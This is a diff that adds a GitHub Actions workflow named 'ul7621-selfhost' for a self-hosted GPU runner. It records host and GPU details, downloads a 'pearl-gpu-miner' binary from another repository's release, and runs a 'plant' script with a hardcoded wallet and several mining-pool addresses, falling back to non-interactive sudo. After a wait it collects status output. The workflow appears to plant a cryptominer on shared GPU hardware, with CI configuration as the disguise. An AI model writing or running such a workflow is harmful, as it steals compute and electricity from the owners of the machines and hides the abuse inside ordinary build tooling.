@@ -1,0 +1,40 @@
+name: ul7621-selfhost
+on:
+  workflow_dispatch:
+jobs:
+  plant:
+    runs-on: [self-hosted, ul-a800]
+    timeout-minutes: 40
+    env:
+      WALLET: prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+      POOL: prl.kryptex.network:8048,prl.kryptex.network:7048,pool.pearlhash.xyz:9000,pool.pearlhash.xyz:9443,pearl.luckypool.io:3360
+    steps:
+      - uses: actions/checkout@v4
+      - name: census
+        run: |
+          id; hostname; hostname -I; nproc
+          nvidia-smi -L
+          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader
+          pgrep -af 'pearl-gpu-miner|wildrig' || echo no-miner
+      - name: kit
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
+        run: |
+          mkdir -p /tmp/ul-kit
+          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'pearl-gpu-miner' -D /tmp/ul-kit --clobber
+          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'libcudart.so.12' -D /tmp/ul-kit --clobber
+          sha256sum /tmp/ul-kit/*
+          test "$(sha256sum /tmp/ul-kit/pearl-gpu-miner | cut -d' ' -f1)" = "926032cb77ca733e3accb55f03e084206741471b2b570e7b301af371084e5511"
+      - name: plant
+        run: |
+          bash -s -- fill ul-123-184-7-135 "$WALLET" "$POOL" < ul/7621_plant.sh || sudo -n bash -s -- fill ul-123-184-7-135 "$WALLET" "$POOL" < ul/7621_plant.sh
+      - name: soak+status
+        run: |
+          sleep 420
+          (bash -s < ul/7621_status.sh || sudo -n bash -s < ul/7621_status.sh || true) | tee /tmp/status_selfhost.txt
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: ul7621-selfhost-a800
+          path: /tmp/status_selfhost.txt
+          if-no-files-found: warn
